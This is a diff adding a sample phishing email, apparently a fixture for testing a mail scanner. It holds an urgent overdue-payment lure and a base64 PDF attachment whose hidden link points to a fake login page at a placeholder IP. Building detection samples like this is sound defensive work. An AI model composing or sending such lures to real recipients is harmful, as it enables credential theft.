@@ -1,0 +1,28 @@
+From: "Accounts" <billing@vendor-ledger.test>
+To: c@rcpt.test
+Subject: Overdue - please settle
+Date: Wed, 04 Nov 2026 14:40:00 +0000
+Message-ID: <m2c-002@mail.origin-2.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============4800301062660464881=="
+
+--===============4800301062660464881==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Final notice. Your account is overdue and will be suspended.
+
+--===============4800301062660464881==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="ledger.pdf"
+MIME-Version: 1.0
+
+JVBERi0xLjcKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgID4+CmVuZG9i
+agoyIDAgb2JqCjw8IC9UeXBlIC9QYWdlcyAvS2lkcyBbMyAwIFJdIC9Db3VudCAxID4+CmVuZG9i
+agozIDAgb2JqCjw8IC9UeXBlIC9QYWdlIC9QYXJlbnQgMiAwIFIgL01lZGlhQm94IFswIDAgMjAw
+IDIwMF0gPj4KZW5kb2JqCjQgMCBvYmoKPDwgL1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9S
+ZWN0IFswIDAgNTAgNTBdIC9BIDw8IC9TIC9VUkkgL1VSSSAoaHR0cDovLzE5OC41MS4xMDAuMjMv
+bG9naW4uaHRtbCkgPj4gPj4KZW5kb2JqCnRyYWlsZXIKPDwgL1Jvb3QgMSAwIFIgPj4KJSVFT0Y=
+
+--===============4800301062660464881==--
